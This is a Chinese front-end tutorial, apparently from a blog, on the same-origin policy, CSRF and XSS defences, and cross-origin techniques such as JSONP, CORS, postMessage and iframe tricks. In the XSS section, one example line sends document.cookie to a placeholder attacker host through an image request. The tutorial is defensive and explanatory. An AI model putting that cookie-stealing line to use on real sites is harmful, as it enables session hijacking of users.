# 前端跨域的基本总结

---

## 跨域概念

> Ajax十分方便，可以在不向服务器提交完整的页面的情况下，实现提交并获取对应数据，然后局部更新页面。但是由于浏览器的安全限制，Ajax不允许跨域请求（浏览器会把跨域请求返回数据拦截掉 = =）

跨域的概念：简单说来，只有当协议，域名，端口相同的时候才算是同一个域名，否则均认为需要做跨域的处理。

| URL                                                          |              说明              |              是否允许通信              |
| :----------------------------------------------------------- | :----------------------------: | :------------------------------------: |
| [http://www.a.com/a.js](https://link.jianshu.com?t=http://www.a.com/a.js)  [http://www.a.com/b.js](https://link.jianshu.com?t=http://www.a.com/b.js) |           同一域名下           |                  允许                  |
| [http://www.a.com/lab/a.js](https://link.jianshu.com?t=http://www.a.com/lab/a.js)  [http://www.a.com/script/b.js](https://link.jianshu.com?t=http://www.a.com/script/b.js) |      同一域名下不同文件夹      |                  允许                  |
| [http://www.a.com:8000/a.js](https://link.jianshu.com?t=http://www.a.com:8000/a.js)  [http://www.a.com/b.js](https://link.jianshu.com?t=http://www.a.com/b.js) |       同一域名，不同端口       |                 不允许                 |
| [http://www.a.com/a.js](https://link.jianshu.com?t=http://www.a.com/a.js)  [https://www.a.com/b.js](https://link.jianshu.com?t=https://www.a.com/b.js) |       同一域名，不同协议       |                 不允许                 |
| [http://www.a.com/a.js](https://link.jianshu.com?t=http://www.a.com/a.js)  [http://70.32.92.74/b.js](https://link.jianshu.com?t=http://70.32.92.74/b.js) |        域名和域名对应ip        |                 不允许                 |
| [http://www.a.com/a.js](https://link.jianshu.com?t=http://www.a.com/a.js)  [http://script.a.com/b.js](https://link.jianshu.com?t=http://script.a.com/b.js) |       主域相同，子域不同       |                 不允许                 |
| [http://www.a.com/a.js](https://link.jianshu.com?t=http://www.a.com/a.js)  [http://file.a.com/b.js](https://link.jianshu.com?t=http://file.a.com/b.js) | 同一域名，不同二级域名（同上） | 不允许（cookie这种情况下也不允许访问） |
| [http://www.cnblogs.com/a.js](https://link.jianshu.com?t=http://www.cnblogs.com/a.js)  [http://www.a.com/b.js](https://link.jianshu.com?t=http://www.a.com/b.js) |            不同域名            |                 不允许                 |

---

## 为什么要做同源策略

因为需要防范**CSRF（Cross-site request forgery）**攻击

> CSRF：简单来说，CSRF就是如果我们登录了一个正常网站A并且在本地生成Cookie，并且未退出的情况下，同时又访问了另一个危险网站B，网站B里面有一段恶意脚本，通过利用（图片的src避开跨域限制之类）本地的cookies来（冒充用户）通过验证并且成功访问A网站的接口来实现一些操作。[具体浏览](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)

若是没有同源策略，那么网络安全可能就会差上很多，不仅仅是不同页面之间可以相互访问对方的服务接口，还因为是cookies可以随意被别的网页上的脚本访问并且可以直接访问带权限的接口，这对于恶意网站来说，想要操作用户的账户做任何操作实在是太轻松了。所以同源策略是必须的。

**防范策略：**

- 使用`post`请求


- 验证 `HTTP Referer` 字段，利用 `HTTP` 头中的 `Referer` 判断请求来源是否合法。
  - `Referer` 的值是由浏览器提供的，不可全信，低版本浏览器下 `Referer` 存在伪造风险。
  - 用户自己可以设置浏览器使其在发送请求时不再提供 `Referer` 时，网站将拒绝合法用户的访问。
- 使用验证码
- 以`HTTP` 请求参数的形式加入一个随机产生的 `token` 交由服务端验证。（若没带上`token`或不正确，则请求失败）
- 在 `HTTP` 头中自定义属性并验证 `One-Time Tokens`，将 `token` 放到 `HTTP` 头中自定义的属性里。通过 `XMLHttpRequest` 的异步请求交由后端校验，并且一次有效。

**XSS**

> 还有一种常见的被动攻击方式：XSS，应该是在网站中插入代码来盗取用户的cookie。原理是通过JavaScript代码注入页面。

- `Reflected XSS`（基于反射的 `XSS` 攻击）：主要通过利用**系统反馈**行为漏洞，并欺骗用户主动触发，从而发起 `Web` 攻击。
- `Stored XSS`（基于存储的 `XSS` 攻击）：`Stored XSS` 和 `Reflected XSS` 的差别就在于，具有攻击性的脚本被保存到了服务器并且可以被普通用户完整的从服务的取得并执行，从而获得了在网络上传播的能力。
- `DOM-based or local XSS`（基于 `DOM` 或本地的 `XSS` 攻击）：`DOM` 型 `XSS` 其实是一种特殊类型的反射型 `XSS`，它是基于 `DOM` 文档对象模型的一种漏洞。可以通过 `DOM` 来动态修改页面内容，从客户端获取 `DOM` 中的数据并在本地执行。基于这个特性，就可以利用 `JS` 脚本来实现 `XSS` 漏洞的利用。

```js
// 常见的XSS插入到DOM的代码，盗取用户的cookie
(new Image()).src = 'http://xxx.cc/steal-cookie?cookies=' + document.cookie
```

**防范策略：**

- 对所有用户提交内容进行可靠的输入验证，包括对 `URL`、查询关键字、`HTTP`头、`POST`数据等，仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容提交，对其他的一律过滤。
- 使用 `HTTP` 头指定类型，很多时候可以使用 `HTTP` 头指定内容的类型，使得输出的内容避免被作为 `HTML` 解析。
- 确认接收的的内容被妥善的规范化，仅包含最小的、安全的 `Tag` (没有 `JS` )，去掉任何对远程内容的引用(尤其是样式表和 `JS` )，可以对内容进行编码，把标签的符号编码掉。
- 使用 `HTTP only` 的 `Cookie`。

---

## 纯粹的跨全域和通过iframe跨域

跨域可分为两种：

- 一种是纯粹的跨域，并不需要依靠iframe和对应的window属性
- 另一种是通过iframe的跨域，通过iframe和一些window属性进行信息的通信。

---

## 纯粹的跨域

- JSONP
- CORS
- Server Proxy

## 通过iframe的方法

- 通过iframe的location.hash
- 通过window.name
- 通过postMessage
- document.domain

---

## JSONP

因为`script`标签的src不受同源策略限制，所以可以通过`script`标签把src添上后台的接口，通过query的形式把函数传到后台，然后后台把参数放到函数里面并返回到前端，因为返回的是JS，同时又是`script`标签，所以直接执行这个函数，通过后台填入的参数进行处理，从而跨域获得后台的数据。

缺点：

- 它支持 GET 请求而不支持 POST 等其它类型的 HTTP 请求。

## CORS

评价：也是使用得最多的跨域手段，有支持多种方式请求的优点（可以用POST）。但是存在兼容问题，仅支持 IE 10 以上

在服务端返回的响应的响应头加上特殊的字段

```js
'Access-Control-Allow-Origin': '*'
```

若浏览器看到这个响应头的话，则会通过检测这个响应头的值是否包含本域，若包含则不会拦截这个服务端的响应

另外CORS还有很多别的响应头，包括有简单请求和复杂请求之分，更多的东西需要另开篇幅讲述。

## Server Proxy

顾名思义，就是浏览器不能做的跨域请求，通过一个同源的服务器接口，访问服务器，让服务器帮你访问那个跨域的接口，返回数据之后再把数据返回给前端。

总结就是一句：通过同源的服务器帮你做这个请求

---

## 黑科技时间（通过iframe实现跨域）

---

## location.hash

若一个页面需要另一个页面的数据，可以这样做

```js
// 主页面

let ifr = document.createElement('iframe')
ifr.style.display = 'none'
ifr.src = "xxx#data"	// 另一个域的页面
document.body.appendChild(ifr)
	
function checkHash() {
    try {
		let data = location.hash ? location.hash.substring(1) : ''
		console.log('获得到的数据是：', data)
    }catch(e) {

    }
}
window.addEventListener('hashchange', function(e) {
	console.log('获得的数据是：', location.hash.substring(1))
})
```

```js
// 另一个域的页面，通过iframe的parent对象访问上层页面修改上层页面的location.hash值来传递信息

switch(location.hash) {
    case "#data":
	    callback()
	    break
}
function callback() {
	const data = "some number: 1111"
	try {
	    parent.location.hash = data
	}catch(e) {
		// 若不能直接修改parent window的hash，则需要再借助一个iframe，不过这个iframe这一次需要与主页面同源才行，因为不能修改也是因为浏览器对跨域的限制
		var ifrproxy = document.createElement('iframe')
		ifrproxy.style.display = 'none'
		ifrproxy.src = 'xxx#' + data     // 该文件在请求域名的域下
		document.body.appendChild(ifrproxy)
	}
}
```

```js
// 第三个页面

parent.parent.location.hash = self.location.hash.substring(1)
```

## window.name

window.name是一个神奇的属性，比如

```js
window.name = "Hello World"
window.location = "http://www.baidu.com"
console.log(window.name) 	// Hello World
```

就是跳转了页面之后仍然可以通过`window.name`访问这个窗口的这个属性。所以我们可以通过`iframe`来实现这种跳转。然后通过访问iframe的`window.name`属性获取到另一个域的数据

```js
// yyy/a.html

let data = ''
const ifr = document.createElement('iframe')
ifr.src = "xxx/b.html"
ifr.style.display = 'none'
document.body.appendChild(ifr)
ifr.onload = function() {
    ifr.onload = function() {
        data = ifr.contentWindow.name
		console.log('收到数据:', data)
    }
    ifr.src = "yyy/c.html"
}
```


```js
// xxx/b.html

window.name = '需要的跨域数据'
```


## postMessage

这个API是HTML5新增的。可以通过这个与iframe互相收发信息。

```js
<iframe src="xxx/b.html" style='display: none;'></iframe>
<script>
window.onload = function() {
    let targetOrigin = 'xxx'
    window.frames[0].postMessage('我要给你发消息了!', targetOrigin)
}
window.addEventListener('message', function(e) {
    console.log('a.html 接收到的消息:', e.data)
})
</script>
```

```js
// b.html

window.addEventListener('message', function(e) {
    if(e.source != window.parent) {
    	return
    }
    let data = e.data
    console.log('b.html 接收到的消息:', data)
    parent.postMessage('我已经接收到消息了!', e.origin)
})
```

## document.domain

对于主域相同而子域不同的情况下，可以通过设置 document.domain 的办法来解决，比如`www.xxx.com/a.html`和`haha.xxx.com/b.html`，当在`a.html`里面插入一个`iframe`，`src`为`haha.xxx.com/b.html`时，在a页面里面是不能直接通过`iframe`的`contentWindow`对象（会报错：Uncaught DOMException: Blocked a frame with origin "xxx" from accessing a cross-origin frame.）

但是我们可以通过设置`document.domain`来实现通信

```js
document.domain = 'xxx.com'
let ifr = document.createElement('iframe')
ifr.src = 'http://sub.example.com/b.html'
ifr.style.display = 'none'
document.body.append(ifr)
ifr.onload = function() {
    let win = ifr.contentWindow
    alert(win.data)
}
```

```js
document.domain = 'xxx.com'
window.data = 'haha'
```


